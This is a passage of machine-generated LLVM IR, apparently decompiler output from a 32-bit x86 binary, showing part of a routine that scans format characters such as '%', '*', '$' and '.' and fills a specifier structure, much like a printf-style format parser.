  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_8052fd1, %dec_label_pc_8052fc5 ], [ 0, %dec_label_pc_8052ff7 ], [ 0, %dec_label_pc_8052ff3 ]
  store i32 %v0_8052fdf, i32* @esi, align 4
  br label %dec_label_pc_8053006

dec_label_pc_8052fe3:                             ; preds = %dec_label_pc_8052fb3, %dec_label_pc_8052faf
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_8052ff3, label %dec_label_pc_8052fea

dec_label_pc_8052fea:                             ; preds = %dec_label_pc_8052fe3
  %v10_8052fea = icmp eq i8 %v2_8052f99, 109
  br i1 %v10_8052fea, label %dec_label_pc_805303c, label %dec_label_pc_805328d

dec_label_pc_8052ff3:                             ; preds = %dec_label_pc_8052fe3
  %tmp153 = icmp ugt i32 %v0_8052f98, %v0_8052fa5
  br i1 %tmp153, label %dec_label_pc_8052ff7, label %dec_label_pc_8052fdf

dec_label_pc_8052ff7:                             ; preds = %dec_label_pc_8052ff3
  %v1_8052ff7 = inttoptr i32 %v0_8052fa5 to i8*
  %v2_8052ff7 = load i8, i8* %v1_8052ff7, align 1
  %v8_8052ff7 = icmp eq i8 %v2_8052ff7, 48
  br i1 %v8_8052ff7, label %dec_label_pc_8052fdf, label %dec_label_pc_805303c

dec_label_pc_8053006:                             ; preds = %dec_label_pc_8052fdf, %dec_label_pc_8053017
  %v0_8053032 = phi i32 [ %v0_8052fdf, %dec_label_pc_8052fdf ], [ %v1_8053017, %dec_label_pc_8053017 ]
  %v4_805301035 = phi i32 [ %v6_8052f99, %dec_label_pc_8052fdf ], [ %v6_8053010, %dec_label_pc_8053017 ]
  store i32 ptrtoint ([8 x i8]* @global_var_805db8a.930 to i32), i32* %edx.global-to-local, align 4
  %v1_8053013 = inttoptr i32 %v0_8053032 to i8*
  br label %dec_label_pc_8053010

dec_label_pc_8053010:                             ; preds = %dec_label_pc_8053021, %dec_label_pc_8053006
  %v4_8053010 = phi i32 [ %v4_805301035, %dec_label_pc_8053006 ], [ %v6_8053010, %dec_label_pc_8053021 ]
  %v0_8053012 = phi i32 [ ptrtoint ([8 x i8]* @global_var_805db8a.930 to i32), %dec_label_pc_8053006 ], [ %v1_8053012, %dec_label_pc_8053021 ]
  %v0_8053021 = phi i32 [ 1, %dec_label_pc_8053006 ], [ %v2_8053021, %dec_label_pc_8053021 ]
  store i32 %v0_8053021, i32* @ecx, align 4
  %v1_8053010 = inttoptr i32 %v0_8053012 to i8*
  %v2_8053010 = load i8, i8* %v1_8053010, align 1
  %v3_8053010 = zext i8 %v2_8053010 to i32
  %v5_8053010 = and i32 %v4_8053010, -256
  %v6_8053010 = or i32 %v3_8053010, %v5_8053010
  store i32 %v6_8053010, i32* %eax.global-to-local, align 4
  %v1_8053012 = add i32 %v0_8053012, 1
  store i32 %v1_8053012, i32* @edx, align 4
  %v2_8053013 = load i8, i8* %v1_8053013, align 1
  %v15_8053013 = icmp eq i8 %v2_8053013, %v2_8053010
  %v1_8053015 = icmp eq i1 %v15_8053013, false
  br i1 %v1_8053015, label %dec_label_pc_805301c, label %dec_label_pc_8053017

dec_label_pc_8053017:                             ; preds = %dec_label_pc_8053010
  %v1_8053017 = add i32 %v0_8053032, 1
  store i32 %v1_8053017, i32* @esi, align 4
  %v0_8053018 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053018 = or i32 %v0_8053018, %v0_8053021
  store i32 %v2_8053018, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8053006

dec_label_pc_805301c:                             ; preds = %dec_label_pc_8053010
  %v1_805301c = inttoptr i32 %v1_8053012 to i8*
  %v2_805301c = load i8, i8* %v1_805301c, align 1
  %v3_805301c = icmp eq i8 %v2_805301c, 0
  br i1 %v3_805301c, label %dec_label_pc_8053025, label %dec_label_pc_8053021

dec_label_pc_8053021:                             ; preds = %dec_label_pc_805301c
  %v2_8053021 = mul i32 %v0_8053021, 2
  br label %dec_label_pc_8053010

dec_label_pc_8053025:                             ; preds = %dec_label_pc_805301c
  %v0_8053025 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053029 = udiv i32 %v0_8053025, 2
  %v1_8053029.not = or i32 %v1_8053029, -6
  %v1_805302e = xor i32 %v1_8053029.not, 5
  store i32 %v1_805302e, i32* %eax.global-to-local, align 4
  %v2_8053030 = and i32 %v1_805302e, %v0_8053025
  store i32 %v2_8053030, i32* %edi.global-to-local, align 4
  %v1_8053032 = add i32 %v0_8053032, -1
  %v2_8053032 = inttoptr i32 %v1_8053032 to i8*
  %v3_8053032 = load i8, i8* %v2_8053032, align 1
  %v12_8053032 = icmp eq i8 %v3_8053032, 37
  %v1_8053036 = icmp eq i1 %v12_8053032, false
  br i1 %v1_8053036, label %dec_label_pc_8052f68, label %dec_label_pc_805303c

dec_label_pc_805303c:                             ; preds = %dec_label_pc_8052ff7, %dec_label_pc_8052fa5, %dec_label_pc_8053025, %dec_label_pc_8052fea
  %v0_805305f = phi i32 [ %v1_8052f91, %dec_label_pc_8052fea ], [ %v1_8052f91, %dec_label_pc_8052ff7 ], [ 0, %dec_label_pc_8053025 ], [ %v1_8052f91, %dec_label_pc_8052fa5 ]
  %v1_8053068 = phi i32 [ %v0_8052f98, %dec_label_pc_8052fea ], [ %v0_8052f98, %dec_label_pc_8052ff7 ], [ %v0_8053032, %dec_label_pc_8053025 ], [ %v0_8052f98, %dec_label_pc_8052fa5 ]
  %v0_8053065 = phi i32 [ %v0_8052fa5, %dec_label_pc_8052fea ], [ %v0_8052fa5, %dec_label_pc_8052ff7 ], [ %v1_8053012, %dec_label_pc_8053025 ], [ %v0_8052fa5, %dec_label_pc_8052fa5 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_8052fea ], [ %stack_var_-32.1, %dec_label_pc_8052ff7 ], [ %stack_var_-32.2, %dec_label_pc_8053025 ], [ %stack_var_-32.1, %dec_label_pc_8052fa5 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_8052fea ], [ 0, %dec_label_pc_8052ff7 ], [ %stack_var_-88.2, %dec_label_pc_8053025 ], [ %stack_var_-88.1, %dec_label_pc_8052fa5 ]
  %v1_805303c = inttoptr i32 %v0_8053065 to i8*
  %v2_805303c = load i8, i8* %v1_805303c, align 1
  %v11_805303c = icmp eq i8 %v2_805303c, 42
  %v1_805303f = icmp eq i1 %v11_805303c, false
  br i1 %v1_805303f, label %dec_label_pc_8053075, label %dec_label_pc_8053041

dec_label_pc_8053041:                             ; preds = %dec_label_pc_805303c
  %v4_8053041 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_8053041, label %dec_label_pc_8053065, label %dec_label_pc_8053048

dec_label_pc_8053048:                             ; preds = %dec_label_pc_8053041
  %v1_8053048 = inttoptr i32 %v1_8053068 to i8*
  %v2_8053048 = load i8, i8* %v1_8053048, align 1
  %v11_8053048 = icmp eq i8 %v2_8053048, 36
  %v1_805304b = icmp eq i1 %v11_8053048, false
  br i1 %v1_805304b, label %dec_label_pc_805328d, label %dec_label_pc_8053051

dec_label_pc_8053051:                             ; preds = %dec_label_pc_8053048
  %tmp91 = icmp slt i32 %v0_805305f, 1
  br i1 %tmp91, label %dec_label_pc_805328d, label %dec_label_pc_8053059

dec_label_pc_8053059:                             ; preds = %dec_label_pc_8053051
  store i32 %v8_8052f6f, i32* %eax.global-to-local, align 4
  %v1_805305e = add i32 %v1_8053068, 1
  store i32 %v1_805305e, i32* @esi, align 4
  %v1_805305f = load i32, i32* @esp, align 4
  %v3_805305f = add i32 %v8_8052f6f, 68
  %v4_805305f = add i32 %v3_805305f, %v1_805305f
  %v5_805305f = inttoptr i32 %v4_805305f to i32*
  store i32 %v0_805305f, i32* %v5_805305f, align 4
  %v0_80530a3.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053070

dec_label_pc_8053065:                             ; preds = %dec_label_pc_8053041
  %v1_8053065 = add i32 %v0_8053065, 1
  store i32 %v1_8053065, i32* %eax.global-to-local, align 4
  %v12_8053068 = icmp eq i32 %v1_8053065, %v1_8053068
  %v1_805306a = icmp eq i1 %v12_8053068, false
  br i1 %v1_805306a, label %dec_label_pc_805328d, label %dec_label_pc_8053070

dec_label_pc_8053070:                             ; preds = %dec_label_pc_8053065, %dec_label_pc_8053059
  %v0_80530a3.pre.pre.pre = phi i32 [ %v1_8053068, %dec_label_pc_8053065 ], [ %v0_80530a3.pre.pre.pre.pre, %dec_label_pc_8053059 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053075

dec_label_pc_8053075:                             ; preds = %dec_label_pc_805303c, %dec_label_pc_8053070
  %v0_80530a3.pre.pre = phi i32 [ %v1_8053068, %dec_label_pc_805303c ], [ %v0_80530a3.pre.pre.pre, %dec_label_pc_8053070 ]
  %v0_8052f0e = phi i32 [ %v0_805305f, %dec_label_pc_805303c ], [ -2147483648, %dec_label_pc_8053070 ]
  %v4_8053075 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_8053075 = icmp eq i32 %v4_8053075, 0
  %v1_805307a = icmp eq i1 %v5_8053075, false
  %.pre = inttoptr i32 %v0_80530a3.pre.pre to i8*
  br i1 %v1_805307a, label %dec_label_pc_805309e, label %dec_label_pc_8053080

dec_label_pc_8053080:                             ; preds = %dec_label_pc_8053075
  %v2_8053080 = load i8, i8* %.pre, align 1
  %v11_8053080 = icmp eq i8 %v2_8053080, 46
  %v1_8053083 = icmp eq i1 %v11_8053080, false
  br i1 %v1_8053083, label %dec_label_pc_8053097, label %dec_label_pc_8053085

dec_label_pc_8053085:                             ; preds = %dec_label_pc_8053080
  %v1_8053085 = add i32 %v0_80530a3.pre.pre, 1
  store i32 %v1_8053085, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052f68.outer

dec_label_pc_8053097:                             ; preds = %dec_label_pc_8053080
  br label %dec_label_pc_805309e

dec_label_pc_805309e:                             ; preds = %dec_label_pc_8053075, %dec_label_pc_8053097
  %stack_var_-96.2 = phi i32 [ %v0_8052f0e, %dec_label_pc_8053097 ], [ %stack_var_-96.1.ph, %dec_label_pc_8053075 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_8053097 ], [ %v0_8052f0e, %dec_label_pc_8053075 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_805db38.931 to i32), i32* @edx, align 4
  %v4_80530a3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80530a3

dec_label_pc_80530a3:                             ; preds = %dec_label_pc_80530ad, %dec_label_pc_805309e
  %v0_80530ad = phi i32 [ %v1_80530ad, %dec_label_pc_80530ad ], [ ptrtoint ([9 x i8]* @global_var_805db38.931 to i32), %dec_label_pc_805309e ]
  %v4_80530a3 = phi i32 [ %v6_80530a3, %dec_label_pc_80530ad ], [ %v4_80530a3.pre, %dec_label_pc_805309e ]
  %v2_80530a3 = load i8, i8* %.pre, align 1
  %v3_80530a3 = zext i8 %v2_80530a3 to i32
  %v5_80530a3 = and i32 %v4_80530a3, -256
  %v6_80530a3 = or i32 %v3_80530a3, %v5_80530a3
  store i32 %v6_80530a3, i32* %eax.global-to-local, align 4
  %v3_80530a5 = inttoptr i32 %v0_80530ad to i8*
  %v4_80530a5 = load i8, i8* %v3_80530a5, align 1
  %v15_80530a5 = icmp eq i8 %v2_80530a3, %v4_80530a5
  br i1 %v15_80530a5, label %dec_label_pc_8052f15, label %dec_label_pc_80530ad

dec_label_pc_80530ad:                             ; preds = %dec_label_pc_80530a3
  %v1_80530ad = add i32 %v0_80530ad, 1
  store i32 %v1_80530ad, i32* @edx, align 4
  %v1_80530ae = inttoptr i32 %v1_80530ad to i8*
  %v2_80530ae = load i8, i8* %v1_80530ae, align 1
  %v3_80530ae = icmp eq i8 %v2_80530ae, 0
  %v1_80530b1 = icmp eq i1 %v3_80530ae, false
  br i1 %v1_80530b1, label %dec_label_pc_80530a3, label %dec_label_pc_80530b3

dec_label_pc_80530b3:                             ; preds = %dec_label_pc_80530ad, %dec_label_pc_8052f15
  %v0_80530c6 = phi i32 [ %v1_8052f15, %dec_label_pc_8052f15 ], [ %v0_80530a3.pre.pre, %dec_label_pc_80530ad ]
  %v0_80530c3 = phi i32 [ %v0_80530ad, %dec_label_pc_8052f15 ], [ %v1_80530ad, %dec_label_pc_80530ad ]
  %v1_80530b5 = add i32 %v0_80530c3, -134601528
  %v1_80530ba = add i32 %v0_80530c3, -134601529
  %v5_80530ba = sub i32 134601528, %v0_80530c3
  %v6_80530ba = and i32 %v1_80530b5, %v5_80530ba
  %v7_80530ba = icmp slt i32 %v6_80530ba, 0
  %v8_80530ba = icmp eq i32 %v1_80530ba, 0
  %v9_80530ba = icmp slt i32 %v1_80530ba, 0
  store i32 %v1_80530ba, i32* %eax.global-to-local, align 4
  %v3_80530bb = icmp eq i1 %v9_80530ba, %v7_80530ba
  %v4_80530bb = icmp eq i1 %v8_80530ba, false
  %v5_80530bb = and i1 %v4_80530bb, %v3_80530bb
  br i1 %v5_80530bb, label %dec_label_pc_80530c7, label %dec_label_pc_80530bd

dec_label_pc_80530bd:                             ; preds = %dec_label_pc_80530b3
  %v1_80530bd = inttoptr i32 %v0_80530c6 to i8*
  %v2_80530bd = load i8, i8* %v1_80530bd, align 1
  %v3_80530bd = zext i8 %v2_80530bd to i32
  %v5_80530bd = and i32 %v1_80530ba, -256
  %v6_80530bd = or i32 %v3_80530bd, %v5_80530bd
  store i32 %v6_80530bd, i32* %eax.global-to-local, align 4
  %v3_80530bf = inttoptr i32 %v0_80530c3 to i8*
  %v4_80530bf = load i8, i8* %v3_80530bf, align 1
  %v15_80530bf = icmp eq i8 %v2_80530bd, %v4_80530bf
  %v1_80530c1 = icmp eq i1 %v15_80530bf, false
  br i1 %v1_80530c1, label %dec_label_pc_80530c7, label %dec_label_pc_80530c3

dec_label_pc_80530c3:                             ; preds = %dec_label_pc_80530bd
  %v1_80530c3 = add i32 %v0_80530c3, 9
  store i32 %v1_80530c3, i32* @edx, align 4
  %v1_80530c6 = add i32 %v0_80530c6, 1
  store i32 %v1_80530c6, i32* @esi, align 4
  br label %dec_label_pc_80530c7

dec_label_pc_80530c7:                             ; preds = %dec_label_pc_80530bd, %dec_label_pc_80530b3, %dec_label_pc_80530c3
  %v4_80530cb = phi i32 [ %v6_80530bd, %dec_label_pc_80530bd ], [ %v1_80530ba, %dec_label_pc_80530b3 ], [ %v6_80530bd, %dec_label_pc_80530c3 ]
  %v0_80530cb = phi i32 [ %v0_80530c6, %dec_label_pc_80530bd ], [ %v0_80530c6, %dec_label_pc_80530b3 ], [ %v1_80530c6, %dec_label_pc_80530c3 ]
  %v0_80530c7 = phi i32 [ %v0_80530c3, %dec_label_pc_80530bd ], [ %v0_80530c3, %dec_label_pc_80530b3 ], [ %v1_80530c3, %dec_label_pc_80530c3 ]
  %v1_80530c7 = add i32 %v0_80530c7, 9
  %v2_80530c7 = inttoptr i32 %v1_80530c7 to i8*
  %v3_80530c7 = load i8, i8* %v2_80530c7, align 1
  %v4_80530c7 = sext i8 %v3_80530c7 to i32
  store i32 %v4_80530c7, i32* %ebx.global-to-local, align 4
  %v1_80530cb = inttoptr i32 %v0_80530cb to i8*
  %v2_80530cb = load i8, i8* %v1_80530cb, align 1
  %v3_80530cb = zext i8 %v2_80530cb to i32
  %v5_80530cb = and i32 %v4_80530cb, -256
  %v6_80530cb = or i32 %v3_80530cb, %v5_80530cb
  store i32 %v6_80530cb, i32* %eax.global-to-local, align 4
  %v2_80530cd = mul nsw i32 %v4_80530c7, 256
  store i32 %v2_80530cd, i32* %ebx.global-to-local, align 4
  %v4_80530d0 = icmp eq i8 %v2_80530cb, 0
  br i1 %v4_80530d0, label %dec_label_pc_805328d, label %dec_label_pc_80530d8

dec_label_pc_80530d8:                             ; preds = %dec_label_pc_80530c7
  %v3_80530d8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_80530d8, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_805db75.932 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80530e1

dec_label_pc_80530e1:                             ; preds = %dec_label_pc_8053131, %dec_label_pc_80530d8
  %v0_8053131 = phi i32 [ %v1_8053131, %dec_label_pc_8053131 ], [ ptrtoint ([21 x i8]* @global_var_805db75.932 to i32), %dec_label_pc_80530d8 ]
  %v3_80530e1 = inttoptr i32 %v0_8053131 to i8*
  %v4_80530e1 = load i8, i8* %v3_80530e1, align 1
  %v15_80530e1 = icmp eq i8 %v2_80530cb, %v4_80530e1
  %v1_80530e3 = icmp eq i1 %v15_80530e1, false
  br i1 %v1_80530e3, label %dec_label_pc_8053131, label %dec_label_pc_80530e5

dec_label_pc_80530e5:                             ; preds = %dec_label_pc_80530e1
  %v1_80530e7 = add i32 %v0_8053131, -134601589
  store i32 %v1_80530e7, i32* %edx.global-to-local, align 4
  %v7_80530f0 = icmp sgt i32 %v1_80530e7, 17
  br i1 %v7_80530f0, label %dec_label_pc_80530f2, label %dec_label_pc_80530fb

dec_label_pc_80530f2:                             ; preds = %dec_label_pc_80530e5
  %v1_80530f2 = add i32 %v0_8053131, -134601591
  store i32 %v1_80530f2, i32* %eax.global-to-local, align 4
  %v3_80530f5 = and i32 %v2_80530cd, 1024
  %v4_80530f5 = icmp eq i32 %v3_80530f5, 0
  %v1_80530f8 = icmp eq i1 %v4_80530f5, false
  %v4_80530f8 = select i1 %v1_80530f8, i32 %v1_80530f2, i32 %v1_80530e7
  store i32 %v4_80530f8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80530fb

dec_label_pc_80530fb:                             ; preds = %dec_label_pc_80530e5, %dec_label_pc_80530f2
  %v0_8053104 = phi i32 [ %v1_80530e7, %dec_label_pc_80530e5 ], [ %v4_80530f8, %dec_label_pc_80530f2 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805db6b.933 to i32), i32* %ecx.global-to-local, align 4
  %v2_8053104 = add i32 %tmp76, 32
  %v3_8053104 = inttoptr i32 %v2_8053104 to i32*
  store i32 %v0_8053104, i32* %v3_8053104, align 4
  %v0_8053107.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_805310b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053107

dec_label_pc_8053107:                             ; preds = %dec_label_pc_8053107, %dec_label_pc_80530fb
  %v0_8053107 = phi i32 [ %v1_8053107, %dec_label_pc_8053107 ], [ %v0_8053107.pre, %dec_label_pc_80530fb ]
  %v1_8053107 = add i32 %v0_8053107, 1
  store i32 %v1_8053107, i32* %ecx.global-to-local, align 4
  %v1_8053108 = inttoptr i32 %v1_8053107 to i8*
  %v2_8053108 = load i8, i8* %v1_8053108, align 1
  %v3_8053108 = sext i8 %v2_8053108 to i32
  store i32 %v3_8053108, i32* %eax.global-to-local, align 4
  %v8_805310d = icmp sgt i32 %v0_805310b.pre, %v3_8053108
  br i1 %v8_805310d, label %dec_label_pc_8053107, label %dec_label_pc_805310f

dec_label_pc_805310f:                             ; preds = %dec_label_pc_8053107
  store i32 ptrtoint ([21 x i8]* @global_var_805db75.932 to i32), i32* @ecx, align 4
  %v1_8053116 = add i32 %v0_8053107, -134601579
  store i32 %v1_8053116, i32* %eax.global-to-local, align 4
  %v2_805311b = add i32 %v0_8053107, add (i32 ptrtoint (i32* @global_var_805db5c.934 to i32), i32 -134601579)
  %v3_805311b = add i32 %v2_805311b, %v1_8053116
  %v4_805311b = inttoptr i32 %v3_805311b to i16*
  %v5_805311b = load i16, i16* %v4_805311b, align 2
  %v6_805311b = sext i16 %v5_805311b to i32
  store i32 %v6_805311b, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_8053116, 2
  %v3_8053123 = add i32 %factor, 134601548
  %v4_8053123 = inttoptr i32 %v3_8053123 to i16*
  %v5_8053123 = load i16, i16* %v4_8053123, align 2
  %v6_8053123 = sext i16 %v5_8053123 to i32
  store i32 %v6_8053123, i32* %eax.global-to-local, align 4
  %v1_805312b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805312b = or i32 %v1_805312b, %v6_805311b
  %v2_805312d = and i32 %v2_805312b, %v6_8053123
  store i32 %v2_805312d, i32* %edx.global-to-local, align 4
  %v0_805313f.pre = load i32, i32* @esi, align 4
  %v0_8053142.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8053137

dec_label_pc_8053131:                             ; preds = %dec_label_pc_80530e1
  %v1_8053131 = add i32 %v0_8053131, 1
  store i32 %v1_8053131, i32* @ecx, align 4
  %v1_8053132 = inttoptr i32 %v1_8053131 to i8*
  %v2_8053132 = load i8, i8* %v1_8053132, align 1
  %v3_8053132 = icmp eq i8 %v2_8053132, 0
  %v1_8053135 = icmp eq i1 %v3_8053132, false
  br i1 %v1_8053135, label %dec_label_pc_80530e1, label %dec_label_pc_8053137

dec_label_pc_8053137:                             ; preds = %dec_label_pc_8053131, %dec_label_pc_805310f
  %v0_8053142 = phi i32 [ %v0_8053142.pre, %dec_label_pc_805310f ], [ %storemerge4, %dec_label_pc_8053131 ]
  %v0_805313f = phi i32 [ %v0_805313f.pre, %dec_label_pc_805310f ], [ %v0_80530cb, %dec_label_pc_8053131 ]
  %v0_8053137 = phi i32 [ %v2_805312d, %dec_label_pc_805310f ], [ %v3_80530d8, %dec_label_pc_8053131 ]
  store i32 %v0_8053137, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_805313f = inttoptr i32 %v0_805313f to i8*
  %v2_805313f = load i8, i8* %v1_805313f, align 1
  %v3_805313f = sext i8 %v2_805313f to i32
  store i32 %v3_805313f, i32* %eax.global-to-local, align 4
  %v2_8053142 = add i32 %tmp76, 4
  %v3_8053142 = inttoptr i32 %v2_8053142 to i32*
  store i32 %v0_8053142, i32* %v3_8053142, align 4
  %v0_8053145 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053145 = load i32, i32* @edx, align 4
  %v2_8053145 = add i32 %v1_8053145, 12
  %v3_8053145 = inttoptr i32 %v2_8053145 to i32*
  store i32 %v0_8053145, i32* %v3_8053145, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_805314c = load i32, i32* @edx, align 4
  %v1_805314c = add i32 %v0_805314c, 28
  %v2_805314c = inttoptr i32 %v1_805314c to i32*
  store i32 1, i32* %v2_805314c, align 4
  %v0_8053153 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053153 = load i32, i32* @edx, align 4
  %v2_8053153 = add i32 %v1_8053153, 8
  %v3_8053153 = inttoptr i32 %v2_8053153 to i32*
  store i32 %v0_8053153, i32* %v3_8053153, align 4
  %v0_8053156 = load i32, i32* %edi.global-to-local, align 4
  %v1_8053160 = and i32 %v0_8053156, -5
  %v0_8053166 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053166 = and i32 %v0_8053166, 3840
  store i32 %v1_8053166, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_805316f = or i32 %v1_8053166, %v1_8053160
  store i32 %v2_805316f, i32* @edi, align 4
  %v1_8053171 = load i32, i32* @edx, align 4
  %v2_8053171 = add i32 %v1_8053171, 20
  %v3_8053171 = inttoptr i32 %v2_8053171 to i32*
  store i32 48, i32* %v3_8053171, align 4
  %v0_8053174 = load i32, i32* @edi, align 4
  %v1_8053174 = load i32, i32* @edx, align 4
  %v2_8053174 = add i32 %v1_8053174, 16
  %v3_8053174 = inttoptr i32 %v2_8053174 to i32*
  store i32 %v0_8053174, i32* %v3_8053174, align 4
  %v0_8053177 = load i32, i32* @ecx, align 4
  %v1_8053177 = inttoptr i32 %v0_8053177 to i8*
  %v2_8053177 = load i8, i8* %v1_8053177, align 1
  %v3_8053177 = icmp eq i8 %v2_8053177, 0
  %v1_805317a = icmp eq i1 %v3_8053177, false
  br i1 %v1_805317a, label %dec_label_pc_8053193, label %dec_label_pc_805317c

dec_label_pc_805317c:                             ; preds = %dec_label_pc_8053137
  %v0_805317c = load i32, i32* @esi, align 4
  %v1_805317c = inttoptr i32 %v0_805317c to i8*
  %v2_805317c = load i8, i8* %v1_805317c, align 1
  %v11_805317c = icmp eq i8 %v2_805317c, 109
  %v1_805317f = icmp eq i1 %v11_805317c, false
  br i1 %v1_805317f, label %dec_label_pc_805328d, label %dec_label_pc_8053185

dec_label_pc_8053185:                             ; preds = %dec_label_pc_805317c
  %v0_8053185 = load i32, i32* @edx, align 4
  %v1_8053185 = add i32 %v0_8053185, 32
  %v2_8053185 = inttoptr i32 %v1_8053185 to i32*
  store i32 20, i32* %v2_8053185, align 4
  %v0_805318c = load i32, i32* @edx, align 4
  %v1_805318c = add i32 %v0_805318c, 28
  %v2_805318c = inttoptr i32 %v1_805318c to i32*
  store i32 0, i32* %v2_805318c, align 4
  br label %dec_label_pc_8053193

dec_label_pc_8053193:                             ; preds = %dec_label_pc_8053137, %dec_label_pc_8053185
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_805322f, label %dec_label_pc_805319e

dec_label_pc_805319e:                             ; preds = %dec_label_pc_8053193
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_8053217 = add i32 %tmp76, 40
  %v4_80531ad = add i32 %tmp76, 36
  %v1_8053220 = add i32 %tmp76, 28
  %v2_8053220 = inttoptr i32 %v1_8053220 to i32*
  br label %dec_label_pc_80531a0

dec_label_pc_80531a0:                             ; preds = %dec_label_pc_805321b, %dec_label_pc_805319e
  %v0_80531b6 = phi i32 [ 0, %dec_label_pc_805319e ], [ %v1_805321f, %dec_label_pc_805321b ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805319e ], [ %stack_var_-88.5, %dec_label_pc_805321b ]
  %v1_80531a0 = add i32 %v0_80531b6, -2
  %v6_80531a0 = sub i32 1, %v0_80531b6
  %v7_80531a0 = and i32 %v6_80531a0, %v0_80531b6
  %v8_80531a0 = icmp slt i32 %v7_80531a0, 0
  %v9_80531a0 = icmp eq i32 %v1_80531a0, 0
  %v10_80531a0 = icmp slt i32 %v1_80531a0, 0
  %v3_80531a3 = icmp eq i1 %v10_80531a0, %v8_80531a0
  %v4_80531a3 = icmp eq i1 %v9_80531a0, false
  %v5_80531a3 = and i1 %v4_80531a3, %v3_80531a3
  br i1 %v5_80531a3, label %dec_label_pc_80531b6, label %dec_label_pc_80531a5

dec_label_pc_80531a5:                             ; preds = %dec_label_pc_80531a0
  %v0_80531a5 = load i32, i32* @esp, align 4
  %v2_80531a5 = mul i32 %v0_80531b6, 4
  %v3_80531a5 = add i32 %v2_80531a5, 68
  %v4_80531a5 = add i32 %v3_80531a5, %v0_80531a5
  %v5_80531a5 = inttoptr i32 %v4_80531a5 to i32*
  %v6_80531a5 = load i32, i32* %v5_80531a5, align 4
  store i32 %v6_80531a5, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_80531ad = trunc i32 %v6_80531a5 to i8
  %v5_80531ad = add i32 %v4_80531ad, %v0_80531b6
  %v6_80531ad = inttoptr i32 %v5_80531ad to i8*
  store i8 %v1_80531ad, i8* %v6_80531ad, align 1
  %v0_80531b1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80531b1 = urem i32 %v0_80531b1, 256
  br label %dec_label_pc_80531bf

dec_label_pc_80531b6:                             ; preds = %dec_label_pc_80531a0
  %v5_80531b8 = add i32 %v0_80531b6, %stack_var_-32.3
  store i32 %v5_80531b8, i32* %eax.global-to-local, align 4
  %v1_80531bc = add i32 %v5_80531b8, -2
  br label %dec_label_pc_80531bf

dec_label_pc_80531bf:                             ; preds = %dec_label_pc_80531a5, %dec_label_pc_80531b6
  %v0_80531d2 = phi i32 [ %v1_80531b1, %dec_label_pc_80531a5 ], [ %v1_80531bc, %dec_label_pc_80531b6 ]
  store i32 %v0_80531d2, i32* %eax.global-to-local, align 4
  %v5_80531bf = sub i32 %v0_80531d2, %stack_var_-88.4
  %v11_80531bf = xor i32 %v0_80531d2, %stack_var_-88.4
  %v12_80531bf = xor i32 %v5_80531bf, %v0_80531d2
  %v13_80531bf = and i32 %v12_80531bf, %v11_80531bf
  %v14_80531bf = icmp slt i32 %v13_80531bf, 0
  %v15_80531bf = icmp eq i32 %v5_80531bf, 0
  %v16_80531bf = icmp slt i32 %v5_80531bf, 0
  %v3_80531c3 = icmp ne i1 %v16_80531bf, %v14_80531bf
  %v4_80531c3 = or i1 %v15_80531bf, %v3_80531c3
  br i1 %v4_80531c3, label %dec_label_pc_80531d2, label %dec_label_pc_80531c5

dec_label_pc_80531c5:                             ; preds = %dec_label_pc_80531bf
  %v1_80531c5 = add i32 %v0_80531d2, -9
  %v6_80531c5 = sub i32 8, %v0_80531d2
  %v7_80531c5 = and i32 %v6_80531c5, %v0_80531d2
  %v8_80531c5 = icmp slt i32 %v7_80531c5, 0
  %v9_80531c5 = icmp eq i32 %v1_80531c5, 0
  %v10_80531c5 = icmp slt i32 %v1_80531c5, 0
  %v3_80531c8 = icmp eq i1 %v10_80531c5, %v8_80531c5
  %v4_80531c8 = icmp eq i1 %v9_80531c5, false
  %v5_80531c8 = and i1 %v4_80531c8, %v3_80531c8
  br i1 %v5_80531c8, label %dec_label_pc_805328d, label %dec_label_pc_80531d2

dec_label_pc_80531d2:                             ; preds = %dec_label_pc_80531c5, %dec_label_pc_80531bf
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_80531bf ], [ %v0_80531d2, %dec_label_pc_80531c5 ]
